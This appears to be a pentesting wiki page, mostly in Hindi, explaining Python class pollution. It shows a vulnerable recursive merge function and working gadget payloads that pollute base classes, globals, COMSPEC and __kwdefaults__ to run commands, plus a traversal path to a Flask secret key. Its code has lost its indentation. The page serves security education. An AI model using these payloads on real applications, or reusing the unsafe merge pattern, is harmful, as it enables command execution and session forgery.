# Class Pollution (Python's Prototype Pollution)

## मूल उदाहरण

किसी instance के class reference के माध्यम से `__qualname__` बदलने पर class और उसकी mutable base classes अपडेट हो जाती हैं।<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Basic Vulnerability Example

एक recursive merge हमलावर-नियंत्रित mapping keys स्वीकार कर सकता है और item या attribute access के माध्यम से nested values लिख सकता है।<sup>[[1]](#references)</sup>
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget Examples

<details>

<summary>RCE (subprocess) के लिए class property का default value बनाना</summary>

एक shared base class, sibling-class command gadget द्वारा उपयोग किए जाने वाला default attribute प्रदान कर सकती है।<sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code> के माध्यम से अन्य classes और global vars को pollute करना</summary>

किसी function की `__globals__` mapping उस module namespace को expose करती है, जो उस module में defined method से reachable होता है।<sup>[[1]](#references)[[4]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>मनमाना subprocess execution</summary>

Windows पर, `Popen(..., shell=True)` default shell के रूप में `COMSPEC` environment variable का उपयोग करता है, इसलिए यह gadget environment-backed command redirection को प्रदर्शित करता है।<sup>[[1]](#references)[[5]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary><strong><code>__kwdefaults__</code></strong> को ओवरराइट करना</summary>

Python `__kwdefaults__` को keyword-only parameters के default values की mapping के रूप में document करता है, जो किसी function definition में `*` या `*args` के बाद आते हैं।<sup>[[4]](#references)</sup> निम्नलिखित gadget polluted function path के माध्यम से उस mapping को ओवरराइट करता है।<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>फ़ाइलों में Flask secret को overwrite करना</summary>

यदि polluted object की class, application के entry-point module से अलग module में रहती है, तो उसके methods का `__globals__` शुरू में class module के namespace को expose करता है। इसके बाद loader और `sys.modules.__main__` के माध्यम से traversal करके entry-point module और उसके Flask `app` object तक पहुँचा जा सकता है।<sup>[[1]](#references)[[2]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Flask session cookie पर हस्ताक्षर करने के लिए `app.secret_key` का उपयोग करता है; इस key को जानने पर attacker मान्य session data बना सकता है।<sup>[[6]](#references)</sup>

मूल writeup में `app.secret_key` तक पहुँचने का निम्नलिखित path दिखाया गया है; CTFtime भी उस writeup की एक copy होस्ट करता है।<sup>[[2]](#references)[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Key बदलने से replacement session cookies को sign करने की अनुमति मिल सकती है और privilege escalation सक्षम हो सकता है; [Flask session tooling page](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) देखें।<sup>[[6]](#references)</sup>

</details>

अधिक read-only gadgets के लिए निम्नलिखित page भी देखें:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Python में Prototype Pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [idekCTF 2022 task manager writeup (मूल)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
- [4] [inspect — live objects का निरीक्षण](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Subprocess management](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Flask Documentation](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
